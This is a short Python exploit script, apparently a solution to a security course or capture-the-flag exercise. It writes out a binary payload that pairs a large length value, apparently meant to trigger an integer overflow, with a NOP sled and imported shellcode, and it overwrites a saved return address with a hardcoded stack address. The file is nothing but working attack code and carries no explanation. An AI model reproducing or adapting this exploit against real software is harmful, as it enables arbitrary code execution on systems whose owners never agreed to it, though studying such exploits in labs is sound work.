import sys
from shellcode import shellcode

return_address = 11
buff = 0xfff6ba20

overflow = 0x40000000

sc = bytes(shellcode)
while len(sc) % 4:
    sc += b"\x90"
sc_ints = [int.from_bytes(sc[i:i+4], "little") for i in range(0, len(sc), 4)]

total  = 160
sled_n = total - (return_address + 1) - len(sc_ints)

payload  = [0x90909090] * return_address
payload += [0]
payload += [0x90909090] * sled_n
payload += sc_ints

payload[return_address] = buff + 4 * (return_address + 1 + sled_n // 2)

sys.stdout.buffer.write(overflow.to_bytes(4, "little"))
for v in payload:
    sys.stdout.buffer.write(v.to_bytes(4, "little"))